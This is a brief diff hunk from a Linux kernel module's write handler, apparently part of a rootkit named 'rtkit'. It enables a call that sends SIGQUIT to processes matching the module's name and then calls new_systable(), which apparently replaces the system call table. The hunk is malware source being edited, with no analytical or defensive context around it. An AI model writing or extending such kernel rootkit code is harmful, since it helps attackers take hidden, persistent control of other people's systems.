@@ -137,7 +137,7 @@ static ssize_t rtkit_write(struct file *file, const char __user *buffer,
 				for_each_process(p) {
 						if(strncmp(p->comm, MODULE_NAME, strlen(MODULE_NAME)) == 0) {
 							printk(KERN_INFO "killing %s\n", p->comm);
-							//do_send_sig_info(SIGQUIT, SEND_SIG_PRIV, p, false);
+							send_sig_info(SIGQUIT, SEND_SIG_PRIV, p);
 						}
 				}
 				new_systable();
